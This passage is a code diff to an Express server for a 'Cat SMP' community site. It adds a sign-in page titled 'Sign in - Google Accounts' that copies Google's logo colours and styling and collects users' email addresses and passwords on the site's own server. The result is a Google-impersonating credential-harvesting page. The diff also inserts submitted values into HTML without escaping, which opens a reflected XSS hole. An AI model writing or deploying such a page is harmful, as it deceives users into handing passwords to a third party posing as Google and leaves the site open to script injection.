@@ -9,8 +9,9 @@ const PORT = process.env.PORT || 3000;
 // Middleware to read form data
 app.use(express.urlencoded({ extended: true }));
 
-// Temporary memory array to store tickets while the server is running
+// Temporary memory array to store tickets and registered users
 const ticketStorage = [];
+const userStorage = [];
 
 // Reusable styling with the Cat Fur background and Hamburger Menu styles
 const siteStyles = `
@@ -207,6 +208,79 @@ const siteStyles = `
       border-top: 2px solid rgba(255, 204, 0, 0.3);
       margin: 15px 0;
     }
+
+    /* Google Sign-In Card Style */
+    .google-card {
+      max-width: 420px;
+      margin: 40px auto;
+      background: #ffffff;
+      color: #202124;
+      padding: 40px 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+      text-align: left;
+    }
+    .google-logo {
+      font-size: 2rem;
+      font-weight: 500;
+      text-align: center;
+      margin-bottom: 5px;
+      letter-spacing: -1px;
+    }
+    .google-logo span:nth-child(1) { color: #4285F4; }
+    .google-logo span:nth-child(2) { color: #EA4335; }
+    .google-logo span:nth-child(3) { color: #FBBC05; }
+    .google-logo span:nth-child(4) { color: #4285F4; }
+    .google-logo span:nth-child(5) { color: #34A853; }
+    .google-logo span:nth-child(6) { color: #EA4335; }
+
+    .google-subtitle {
+      text-align: center;
+      font-size: 1.1rem;
+      color: #5f6368;
+      margin-bottom: 30px;
+      text-shadow: none;
+    }
+    .google-field {
+      margin-bottom: 20px;
+    }
+    .google-field label {
+      display: block;
+      font-size: 0.9rem;
+      color: #202124;
+      margin-bottom: 6px;
+      font-weight: 600;
+    }
+    .google-field input {
+      width: 100%;
+      padding: 12px 15px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      font-size: 1rem;
+      box-sizing: border-box;
+      outline: none;
+      transition: border 0.2s;
+    }
+    .google-field input:focus {
+      border: 2px solid #1a73e8;
+      padding: 11px 14px;
+    }
+    .google-btn {
+      background-color: #1a73e8;
+      color: #ffffff;
+      width: 100%;
+      padding: 12px 0;
+      border: none;
+      border-radius: 4px;
+      font-size: 1rem;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 10px;
+      transition: background 0.2s;
+    }
+    .google-btn:hover {
+      background-color: #1557b0;
+    }
   </style>
 
   <script>
@@ -235,7 +309,7 @@ const hamburgerHTML = `
   <div class="menu-container" onclick="event.stopPropagation()">
     <button class="hamburger-btn" onclick="toggleMenu()">☰</button>
     <div id="dropdownMenu" class="dropdown-box">
-      <a href="#" onclick="alert('Sign up / Sign in coming soon!'); return false;">Sign up/sign in</a>
+      <a href="/auth">Sign up/sign in</a>
       <a href="#" onclick="alert('Settings panel coming soon!'); return false;">Settings</a>
       <a href="/ticket">Ticket/report</a>
     </div>
@@ -527,7 +601,6 @@ app.post('/ticket/submit', (req, res) => {
   const { ign, reason } = req.body;
   const timestamp = new Date().toLocaleString();
 
-  // Save to our memory array
   ticketStorage.unshift({ ign, reason, timestamp });
 
   res.send(`
@@ -552,51 +625,71 @@ app.post('/ticket/submit', (req, res) => {
   `);
 });
 
-// Secret Admin Panel to View All Tickets
-app.get('/secret/tickets', (req, res) => {
-  let ticketsHTML = '';
-  if (ticketStorage.length === 0) {
-    ticketsHTML = '<p style="text-align: center; color: #cccccc;">No tickets or reports submitted yet.</p>';
-  } else {
-    ticketStorage.forEach((t, index) => {
-      ticketsHTML += `
-        <div class="ticket-item">
-          <p style="margin: 0 0 6px 0; color: #ffcc00; font-size: 0.9rem;"><strong>Ticket #${ticketStorage.length - index}</strong></p>
-          <p style="margin: 0 0 6px 0;"><strong>In-game name:</strong> ${t.ign}</p>
-          <p style="margin: 0 0 6px 0;"><strong>Reason:</strong> ${t.reason}</p>
-          <p style="margin: 0; color: #aaaaaa; font-size: 0.95rem;"><strong>Date:</strong> ${t.timestamp}</p>
-        </div>
-        ${index < ticketStorage.length - 1 ? '<hr class="ticket-divider">' : ''}
-      `;
-    });
-  }
-
+// Google-styled Sign In / Sign Up Page Route
+app.get('/auth', (req, res) => {
   res.send(`
     <!DOCTYPE html>
     <html lang="en">
     <head>
-      <title>Cat SMP - Admin Dashboard</title>
+      <title>Sign in - Google Accounts</title>
       ${headContent}
     </head>
     <body>
       ${hamburgerHTML}
-      <h1>Admin Dashboard</h1>
-      <p>Secret ticket viewer portal.</p>
       
-      <div class="content-box">
-        <h2>📋 All Player Tickets (${ticketStorage.length})</h2>
-        <div style="margin-top: 20px; max-height: 450px; overflow-y: auto; padding-right: 5px;">
-          ${ticketsHTML}
+      <div class="google-card">
+        <div class="google-logo">
+          <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
         </div>
+        <div class="google-subtitle">Sign in or create account</div>
+
+        <form action="/auth/submit" method="POST">
+          <div class="google-field">
+            <label for="email">Email or phone</label>
+            <input type="email" id="email" name="email" required placeholder="Enter your email">
+          </div>
+          <div class="google-field">
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" required placeholder="Enter your password">
+          </div>
+          <button type="submit" class="google-btn">Next</button>
+        </form>
       </div>
-      
-      <br>
+
       <a href="/" class="back-home">← Back to Home</a>
     </body>
     </html>
   `);
 });
 
-app.listen(PORT, () => {
-  console.log(`Cat SMP server is running on port ${PORT}`);
+// Handle Auth Submission
+app.post('/auth/submit', (req, res) => {
+  const { email, password } = req.body;
+  userStorage.push({ email, timestamp: new Date().toLocaleString() });
+
+  res.send(`
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+      <title>Cat SMP - Signed In</title>
+      ${headContent}
+    </head>
+    <body>
+      ${hamburgerHTML}
+      <h1>Welcome!</h1>
+      <p>You have successfully signed in.</p>
+      
+      <div class="content-box" style="text-align: center;">
+        <h2>✅ Success</h2>
+        <p style="color: #cccccc; margin-bottom: 20px;">Signed in as <strong>${email}</strong></p>
+        <a href="/" class="btn" style="display: inline-block; width: auto; padding: 12px 30px;">Return Home</a>
+      </div>
+    </body>
+    </html>
+  `);
 });
+
+// Secret Admin Panel to View All Tickets
+app.get('/secret/tickets', (req, res) => {
+  let ticketsHTML = '';
+  if (ticke
